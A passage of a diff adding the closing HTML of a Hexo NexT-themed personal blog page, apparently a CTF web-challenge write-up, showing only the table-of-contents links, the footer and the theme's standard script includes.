href="#web4"><span class="nav-number">8.</span> <span class="nav-text">web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web15"><span class="nav-number">9.</span> <span class="nav-text">web15</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web22"><span class="nav-number">10.</span> <span class="nav-text">web22</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web21"><span class="nav-number">11.</span> <span class="nav-text">web21</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web23"><span class="nav-number">12.</span> <span class="nav-text">web23</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web7"><span class="nav-number">13.</span> <span class="nav-text">web7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web12"><span class="nav-number">14.</span> <span class="nav-text">web12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web24"><span class="nav-number">15.</span> <span class="nav-text">web24</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">夜莫离、</span>
+
+  
+</div>
+
+
+  <!-- <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div> 
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>-->
+
+
+
+<div class="theme-info">
+ <div class="powered-by"></div>
+ <span class="post-count">博客全站共38.6k字</span>
+</div>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
